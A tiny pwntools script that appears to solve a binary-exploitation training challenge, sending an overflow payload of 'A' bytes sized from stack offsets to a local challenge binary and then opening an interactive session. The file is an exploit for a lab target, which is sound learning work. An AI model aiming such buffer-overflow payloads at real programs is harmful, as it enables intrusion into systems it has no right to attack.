from pwn import *

r = process('/challenge/binary-exploitation-lose-variable')

payload = (0x88 - 0x18 + 4) * b"A"

r.sendline(payload)
r.interactive()